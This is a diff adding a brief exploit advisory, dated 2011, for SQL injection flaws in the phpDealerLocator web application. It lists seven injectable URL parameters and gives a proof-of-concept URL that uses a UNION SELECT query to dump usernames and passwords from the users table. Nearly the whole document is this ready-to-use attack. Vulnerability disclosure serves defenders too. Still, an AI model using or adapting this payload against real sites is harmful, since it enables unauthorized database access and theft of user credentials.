@@ -1,0 +1,27 @@
+# Exploit Title: phpDealerLocator - Multiple SQL Injection vulnerabilities
+# Date: 7/3/2011
+# Author: Robert Cooper (admin[at]websiteauditing.org)
+# Software Link: phpdealerlocator.yourphppro.com
+# Tested on: [Linux/Windows 7]
+#Vulnerable Parameters: 
+
+record.php?Dealer_ID=
+record_country.php?Dealer_ID=
+results_latlong.php?s_Latitude=
+results_latlong.php?s_Longitude=
+results_latlong.php?s_Dealer_Radius=
+results_phone.php?s_Dealer_Radius=
+results_radius.php?s_Dealer_Radius=
+
+##############################################################
+PoC:
+
+http://www.example.com/Locator/record.php?Dealer_ID=00000026 union all select 1,2,3,4,5,group_concat(Users_Name,0x3a,Users_Password,0x0a),7,8 FROM users--
+
+
+##############################################################
+www.websiteauditing.org
+www.areyousecure.net
+
+# Shouts to the Belegit crew
+
